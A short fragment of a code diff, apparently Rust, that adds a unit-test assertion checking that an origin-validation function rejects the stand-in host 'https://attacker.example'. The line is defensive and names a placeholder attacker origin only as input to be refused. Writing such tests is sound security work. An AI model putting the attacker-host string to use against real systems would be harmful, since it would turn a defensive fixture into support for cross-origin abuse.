+        assert!(!is_allowed_origin("https://attacker.example"));
     }
 }
